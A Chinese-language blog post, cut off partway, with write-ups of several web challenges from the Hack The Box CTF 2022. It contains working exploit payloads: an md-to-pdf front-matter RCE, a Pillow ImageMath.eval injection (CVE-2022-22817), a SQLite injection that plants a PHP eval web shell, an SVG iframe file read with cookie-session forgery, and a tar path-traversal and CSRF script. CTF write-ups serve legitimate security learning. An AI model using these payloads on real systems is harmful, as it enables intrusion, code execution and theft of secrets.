<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>



<link rel="canonical" href="http://example.com/2023/12/25/hackthebox/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/12/25/hackthebox/","path":"2023/12/25/hackthebox/","title":"HACKTHEBOX-CTF2022"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>HACKTHEBOX-CTF2022 | Y0ng's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Y0ng's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Before"><span class="nav-text">Before</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Kryptos-Support"><span class="nav-text">Kryptos Support</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BlinkerFluids"><span class="nav-text">BlinkerFluids</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Amidst-Us"><span class="nav-text">Amidst Us</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Intergalactic-Post"><span class="nav-text">Intergalactic Post</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Mutation-Lab"><span class="nav-text">Mutation Lab</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Acnologia-Portal"><span class="nav-text">Acnologia Portal</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Spiky-Tamagotchy"><span class="nav-text">Spiky Tamagotchy</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Red-Island"><span class="nav-text">Red Island</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Genesis-Wallet"><span class="nav-text">Genesis Wallet</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Genesis-Wallet%E2%80%99s-Revenge"><span class="nav-text">Genesis Wallet’s Revenge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CheckpointBots"><span class="nav-text">CheckpointBots</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Y0ng</p>
  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/25/hackthebox/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Y0ng">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Y0ng's Blog">
      <meta itemprop="description" content="花有重开日，人无再少年">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="HACKTHEBOX-CTF2022 | Y0ng's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HACKTHEBOX-CTF2022
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-12-25 00:41:11" itemprop="dateCreated datePublished" datetime="2023-12-25T00:41:11+08:00">2023-12-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220519192325321.png" alt="image-20220519192325321"></p>
<a id="more"></a>

<h1 id="Before"><a href="#Before" class="headerlink" title="Before"></a>Before</h1><p>五天的比赛，总共61道赛题，11道web题目，队友依旧给力，pwn,re,misc等都ak了，最后写出了59道题目，位于7014支队伍的第7名。</p>
<p>目前是周四下午18.30，距离比赛结束还有2h，结束五天沉迷解题的状态，下载附件、代码审计、发现异常、搜索漏洞、构造payload、本地测试， 一个字：爽。不过web这回算是个败笔了，差一题AK，啧啧啧，我太菜了</p>
<h1 id="Kryptos-Support"><a href="#Kryptos-Support" class="headerlink" title="Kryptos Support"></a>Kryptos Support</h1><ul>
<li>逻辑漏洞</li>
<li>XSS</li>
</ul>
<blockquote>
<p>The secret vault used by the Longhir’s planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?</p>
</blockquote>
<p>开局一个留言框</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515183913950.png" alt="image-20220515183913950"></p>
<p>可以xss到cookie，替换后可以更改密码。抓更改密码的包，发现可以更换uid，更换为1，就可以换掉admin的密码了，然后登录admin</p>
<p>FLAG：HTB{x55_4nd_id0rs_ar3_fun!!} </p>
<h1 id="BlinkerFluids"><a href="#BlinkerFluids" class="headerlink" title="BlinkerFluids"></a>BlinkerFluids</h1><ul>
<li>gray-matter</li>
<li>md-to-pdf</li>
</ul>
<p>实现的功能就是用户可控输入，将md格式转换为pdf文件，使用的组件就是 md-to-pdf</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515071114887.png" alt="image-20220515071114887"></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515071229355.png" alt="image-20220515071229355"></p>
<p>找到了相关cve漏洞，<a target="_blank" rel="noopener" href="https://github.com/simonhaenisch/md-to-pdf/issues/99">https://github.com/simonhaenisch/md-to-pdf/issues/99</a></p>
<p>payload，机器不出网，写到static下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---js</span><br><span class="line">((require(&quot;child_process&quot;)).execSync(&quot;cat &#x2F;flag.txt &gt; &#x2F;app&#x2F;static&#x2F;test.txt&quot;))</span><br><span class="line">---RCE</span><br></pre></td></tr></table></figure>

<p>FLAG：HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}</p>
<h1 id="Amidst-Us"><a href="#Amidst-Us" class="headerlink" title="Amidst Us"></a>Amidst Us</h1><ul>
<li>Pillow 9.0.0</li>
<li>ImageMath.eval</li>
</ul>
<blockquote>
<p>The AmidstUs tribe is a notorious group of sleeper agents for hire. We have plausible reasons to believe they are working with Draeger, so we have to take action to uncover their identities. Ulysses and bonnie have infiltrated their HQ and came across this mysterious portal on one of the unlocked computers. Can you hack into it despite the low visibility and get them access?</p>
</blockquote>
<p>下载附件审计代码，主要功能是上传一个图片，然后调用PIL库中的函数进行图像的更改</p>
<p>可以看到调用了make_alpha()函数</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515133018844.png" alt="image-20220515133018844"></p>
<p>看一下功能，去获取传入的background，然后下面调用了eval函数，根据以往经验，这个eval肯定是存在问题的</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515133133299.png"></p>
<p>果然找到相关cve信息 CVE-2022-22817 <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2022-22817">NVD - CVE-2022-22817 (nist.gov)</a>，Pillow 9.0.0 之前的 ImageMath.eval 允许计算任意表达式</p>
<p>我们紧接着看下面的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alpha = ImageMath.<span class="built_in">eval</span>(</span><br><span class="line">			<span class="string">f&#x27;&#x27;&#x27;float(</span></span><br><span class="line"><span class="string">				max(</span></span><br><span class="line"><span class="string">				max(</span></span><br><span class="line"><span class="string">					max(</span></span><br><span class="line"><span class="string">					difference1(red_band, <span class="subst">&#123;color[<span class="number">0</span>]&#125;</span>),</span></span><br><span class="line"><span class="string">					difference1(green_band, <span class="subst">&#123;color[<span class="number">1</span>]&#125;</span>)</span></span><br><span class="line"><span class="string">					),</span></span><br><span class="line"><span class="string">					difference1(blue_band, <span class="subst">&#123;color[<span class="number">2</span>]&#125;</span>)</span></span><br><span class="line"><span class="string">				),</span></span><br><span class="line"><span class="string">				max(</span></span><br><span class="line"><span class="string">					max(</span></span><br><span class="line"><span class="string">					difference2(red_band, <span class="subst">&#123;color[<span class="number">0</span>]&#125;</span>),</span></span><br><span class="line"><span class="string">					difference2(green_band, <span class="subst">&#123;color[<span class="number">1</span>]&#125;</span>)</span></span><br><span class="line"><span class="string">					),</span></span><br><span class="line"><span class="string">					difference2(blue_band, <span class="subst">&#123;color[<span class="number">2</span>]&#125;</span>)</span></span><br><span class="line"><span class="string">				)</span></span><br><span class="line"><span class="string">				)</span></span><br><span class="line"><span class="string">			)&#x27;&#x27;&#x27;</span>,</span><br><span class="line">			difference1=<span class="keyword">lambda</span> source, color: (source - color) / (<span class="number">255.0</span> - color),</span><br><span class="line">			difference2=<span class="keyword">lambda</span> source, color: (color - source) / color,</span><br><span class="line">			red_band=img_bands[<span class="number">0</span>],</span><br><span class="line">			green_band=img_bands[<span class="number">1</span>],</span><br><span class="line">			blue_band=img_bands[<span class="number">2</span>]</span><br><span class="line">		)</span><br><span class="line"></span><br><span class="line">		new_bands = [</span><br><span class="line">			ImageMath.<span class="built_in">eval</span>(</span><br><span class="line">				<span class="string">&#x27;convert((image - color) / alpha + color, &quot;L&quot;)&#x27;</span>,</span><br><span class="line">				image=img_bands[i],</span><br><span class="line">				color=color[i],</span><br><span class="line">				alpha=alpha</span><br><span class="line">			)</span><br><span class="line">			<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)</span><br><span class="line">		]</span><br></pre></td></tr></table></figure>

<p>payload，老样子不出网</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;image&quot;:&quot;iVBORw0...&quot;,&quot;background&quot;:[255,255,&quot;__import__(&#39;os&#39;).system(&#39;cat &#x2F;flag.txt &gt; &#x2F;app&#x2F;application&#x2F;static&#x2F;js&#x2F;test.txt&#39;)&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515142221771.png" alt="image-20220515142221771"></p>
<p>FLAG：HTB{i_slept_my_way_to_rce}</p>
<h1 id="Intergalactic-Post"><a href="#Intergalactic-Post" class="headerlink" title="Intergalactic Post"></a>Intergalactic Post</h1><ul>
<li>SQlite3 写shell</li>
</ul>
<blockquote>
<p>The biggest intergalactic newsletter agency has constantly been spreading misinformation about the energy crisis war. Bonnie’s sources confirmed a hostile takeover of the agency took place a few months back, and we suspect the Golden Fang army is behind this. Ulysses found us a potential access point to their agency servers. Can you hack their newsletter subscribe portal and get us entry?</p>
</blockquote>
<p>使用sqlite3，发现一个注入处而且使用的是exec，可以堆叠写shell，关于sqlite的注入：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8627#toc-5">https://xz.aliyun.com/t/8627#toc-5</a></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515232701843.png" alt="image-20220515232701843"></p>
<p>本地测试成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test2&#39;,&#39;1@qq.com&#39;);ATTACH DATABASE &#39;D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;htb&#x2F;challenge&#x2F;tmp&#x2F;shell.php&#39; AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES (&#39;&lt;?php phpinfo();?&gt;&#39;);--</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220516134739755.png" alt="image-20220516134739755"></p>
<p>对于题目找对写的路径就行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: test2&#39;,&#39;1@qq.com&#39;);ATTACH DATABASE &#39;static&#x2F;shell.php&#39; AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES (&#39;&lt;?php @eval($_POST[&quot;x&quot;]); ?&gt;&#39;);--</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220516135539466.png" alt="image-20220516135539466"></p>
<p>FLAG：HTB{inj3ct3d_th3_tru7h}</p>
<h1 id="Mutation-Lab"><a href="#Mutation-Lab" class="headerlink" title="Mutation Lab"></a>Mutation Lab</h1><ul>
<li>nodejs</li>
<li>cookie-session伪造</li>
<li>convert-svg-core</li>
</ul>
<blockquote>
<p>One of the renowned scientists in the research of cell mutation, Dr. Rick, was a close ally of Draeger. The by-products of his research, the mutant army wrecked a lot of havoc during the energy-crisis war. To exterminate the leftover mutants that now roam over the abandoned areas on the planet Vinyr, we need to acquire the cell structures produced in Dr. Rick’s mutation lab. Ulysses managed to find a remote portal with minimal access to Dr. Rick’s virtual lab. Can you help him uncover the experimentations of the wicked scientist?</p>
</blockquote>
<p>可以看到需要以admin用户登录</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515165415343.png" alt="image-20220515165415343"></p>
<p>抓包看看，发现返回一个 session 和 session.sig</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515173221436.png" alt="image-20220515173221436"></p>
<p>session为 <code>&#123;&quot;username&quot;:&quot;123-1234-1233&quot;&#125;</code> 很明显需要伪造身份为admin，但是<strong>session.sig作为验证session的东西，需要知道secret_key</strong> 来进行伪造。</p>
<p>注册用户登录成功后发现有导出图片功能，抓包让其报错，可知用到了 <strong>convert-svg-core</strong> 库，搜索其漏洞：<a target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-1582785">https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-1582785</a></p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;svg&quot;:&quot;&lt;svg-dummy&gt;&lt;&#x2F;svg-dummy&gt;&lt;iframe src&#x3D;\&quot;file:&#x2F;&#x2F;&#x2F;app&#x2F;index.js\&quot; width&#x3D;\&quot;100%\&quot; height&#x3D;\&quot;1000px\&quot;&gt;&lt;&#x2F;iframe&gt;&lt;svg version&#x3D;\&quot;1.1\&quot; xmlns&#x3D;\&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg\&quot; xmlns:xlink&#x3D;\&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink\&quot; width&#x3D;\&quot;500\&quot; height&#x3D;\&quot;400\&quot; viewBox&#x3D;\&quot;0,0,500,400\&quot;&gt;&lt;&#x2F;svg&gt;&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515174121644.png" alt="image-20220515174121644"></p>
<p>再去获取 .env 文件得到 key</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SESSION_SECRET_KEY&#x3D;5921719c3037662e94250307ec5ed1db</span><br></pre></td></tr></table></figure>

<p>开始伪造</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> session = <span class="built_in">require</span>(<span class="string">&#x27;cookie-session&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">  name: <span class="string">&#x27;session&#x27;</span>,</span><br><span class="line">  keys: [<span class="string">&#x27;5921719c3037662e94250307ec5ed1db&#x27;</span>]</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    req.session.username = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    res.json(&#123;</span><br><span class="line">    wow: <span class="string">&#x27;Y0ng&#x27;</span>,</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.listen(<span class="number">3000</span>)</span><br></pre></td></tr></table></figure>

<p>替换session与session.sig，成功admin身份登录</p>
<p>FLAG：HTB{fr4m3d_th3_s3cr37s_f0rg3d_th3_entrY}</p>
<h1 id="Acnologia-Portal"><a href="#Acnologia-Portal" class="headerlink" title="Acnologia Portal"></a>Acnologia Portal</h1><ul>
<li>flask</li>
<li>CSRF</li>
<li>目录穿越zip</li>
<li>SSTI</li>
</ul>
<blockquote>
<p>Bonnie has confirmed the location of the Acnologia spacecraft operated by the Golden Fang mercenary. Before taking over the spaceship, we need to disable its security measures. Ulysses discovered an accessible firmware management portal for the spacecraft. Can you help him get in?</p>
</blockquote>
<p>首先通读代码，发现其中的report路由下可以添加报告，然后bot会去查看report，所以这里存在一个xss</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220516150331246.png" alt="image-20220516150331246"></p>
<p>看到bot以admin身份进行登录</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220516150509630.png" alt="image-20220516150509630"></p>
<p>接着往下看函数功能，有一个上传的功能，这里有个 is_admin 的判断</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220516150619486.png"></p>
<p>限制了本地登录，所以窃取cookie进行登录不可实现了，可以尝试借助xss，然后让管理员上传文件然后去打SSTI</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220516150720086.png" alt="image-20220516150720086"></p>
<p>来看一下上传的功能点，重点就是这里解压文件处，可以利用构造带 <code>..</code> 来进行目录穿越</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220516210533728.png" alt="image-20220516210533728"></p>
<p>如果去翻看文档，会发现这里就是一个警告</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220516210605254.png" alt="image-20220516210605254"></p>
<p>本地实验：</p>
<p>脚本生成个目录穿越的 test.tar.gz，这里的目录以及文件必须要存在</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"><span class="comment">#创建压缩包名</span></span><br><span class="line">tar = tarfile.<span class="built_in">open</span>(<span class="string">&quot;/tmp/test.tar.gz&quot;</span>,<span class="string">&quot;w:gz&quot;</span>)</span><br><span class="line"><span class="comment">#创建压缩包</span></span><br><span class="line">tar.add(<span class="string">&#x27;../app/application/templates/y0ng.html&#x27;</span>)</span><br><span class="line">tar.close()</span><br></pre></td></tr></table></figure>

<p>app.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, jsonify, redirect, render_template, request,Flask</span><br><span class="line"><span class="keyword">import</span> functools, tarfile, tempfile, os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> response(<span class="string">&#x27;Missing required parameters!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    extraction = extract_firmware(request.files[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> extraction:</span><br><span class="line">        <span class="keyword">return</span> response(<span class="string">&#x27;Firmware update initialized successfully.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response(<span class="string">&#x27;Something went wrong, please try again!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_firmware</span>(<span class="params">file</span>):</span>  <span class="comment"># 上传文件功能</span></span><br><span class="line">    tmp  = tempfile.gettempdir()   <span class="comment"># /tmp 临时目录</span></span><br><span class="line">    path = os.path.join(tmp, file.filename)  <span class="comment"># /tmp/test.txt</span></span><br><span class="line">    file.save(path)  <span class="comment"># 保存文件</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tarfile.is_tarfile(path): <span class="comment"># 是tarfile</span></span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(path, <span class="string">&#x27;r:gz&#x27;</span>)  <span class="comment"># gzip打开</span></span><br><span class="line">        tar.extractall(tmp)  <span class="comment"># 解压所有文件</span></span><br><span class="line">        <span class="comment"># exp：/tmp/ ../app/application/templates/y0ng.html</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#rand_dir = generate(15)</span></span><br><span class="line">        extractdir = <span class="string">&quot;/app/application/static/firmware_extract/rand&quot;</span> <span class="comment"># /app/application/static/firmware_extract</span></span><br><span class="line">        os.makedirs(extractdir, exist_ok=<span class="literal">True</span>) <span class="comment"># 创建目录</span></span><br><span class="line">        <span class="keyword">for</span> tarinfo <span class="keyword">in</span> tar:</span><br><span class="line">            name = tarinfo.name</span><br><span class="line">            <span class="keyword">if</span> tarinfo.isreg():</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    filename = <span class="string">f&#x27;<span class="subst">&#123;extractdir&#125;</span>/<span class="subst">&#123;name&#125;</span>&#x27;</span> <span class="comment"># /app/application/static/firmware_extract/rand/&#123;name&#125;</span></span><br><span class="line">                    <span class="comment"># /app/application/static/firmware_extract/rand/  name = ../../../templates/index.html</span></span><br><span class="line">                    os.rename(os.path.join(tmp, name), filename)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">            os.makedirs(<span class="string">f&#x27;<span class="subst">&#123;extractdir&#125;</span>/<span class="subst">&#123;name&#125;</span>&#x27;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">        tar.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">response</span>(<span class="params">message</span>):</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: message&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">3000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>上传文件：成功了！</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220516210910214.png" alt="image-20220516210910214"></p>
<p>剩下的就是通过 js 达到一个CSRF的效果</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">submitRequest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xhr.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://localhost:1337/api/firmware/upload&quot;</span>);</span><br><span class="line">        xhr.setRequestHeader(<span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>);</span><br><span class="line">        xhr.setRequestHeader(<span class="string">&quot;Accept-Language&quot;</span>, <span class="string">&quot;de-de,de;q=0.8,en-us;q=0.5,en;q=0.3&quot;</span>);</span><br><span class="line">    	xhr.setRequestHeader(<span class="string">&quot;Origin&quot;</span>, <span class="string">&quot;null&quot;</span>);</span><br><span class="line">        xhr.setRequestHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundarypXheHIDWfea2zg7D&quot;</span>);</span><br><span class="line">        xhr.withCredentials = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> body = </span><br><span class="line">          <span class="string">&quot;------WebKitFormBoundarypXheHIDWfea2zg7D\r\n&quot;</span> +</span><br><span class="line">          <span class="string">&quot;Content-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;test.tar.gz\&quot;\r\n&quot;</span> +</span><br><span class="line">          <span class="string">&quot;Content-Type: application/x-gzip\r\n&quot;</span> +</span><br><span class="line">          <span class="string">&quot;\r\n&quot;</span> +<span class="built_in">decodeURIComponent</span>(atob(<span 